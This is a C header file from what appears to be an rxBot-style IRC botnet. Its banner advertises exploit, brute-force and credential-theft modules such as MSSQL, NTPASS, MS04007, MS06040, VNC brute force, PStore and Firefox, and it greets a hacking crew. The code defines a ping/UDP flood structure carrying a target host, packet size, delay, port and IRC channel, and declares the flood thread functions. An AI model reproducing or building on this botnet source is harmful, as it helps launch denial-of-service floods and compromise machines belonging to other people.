/* |  _ \ \ \/ /    / |___ \ / _ \ TesT |  \/  |/ _ \|  _ \    \ \   / /___ \ 
   | |_) | \  /_____| | __) | | | |_____| |\/| | | | | | | |____\ \ / /  __) |
   |  _ <  /  \_____| |/ __/| |_| |_____| |  | | |_| | |_| |_____\ V /  / __/ 
   |_| \_\/_/\_\ BuZ|_|_____|\___/      |_|  |_|\___/|____/  BuZ  \_/  |_____|
   ---------------------------------------------------------------------------
   --MSSQL-NTPASS-SYM06010-MS04007-MS06040-VNCBRUTE-PSTORE-FIREFOX-SP2PATCH---  
   ---------------------------------------------------------------------------
               Greets To: THE REAL CODERS & The Ryan1918 Crew !!
 */
#if !defined NO_PING && !defined NO_UDP
 // ping/udp structure.
typedef struct PINGFLOOD 
{
	SOCKET sock;
	char chan[128];
	char host[128];
	int num;
	int size;
	int delay;
	int port;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} PINGFLOOD;
#endif

#ifndef NO_PING
DWORD WINAPI ping(LPVOID param);
#endif

#ifndef NO_UDP
DWORD WINAPI udp(LPVOID param);
#endif

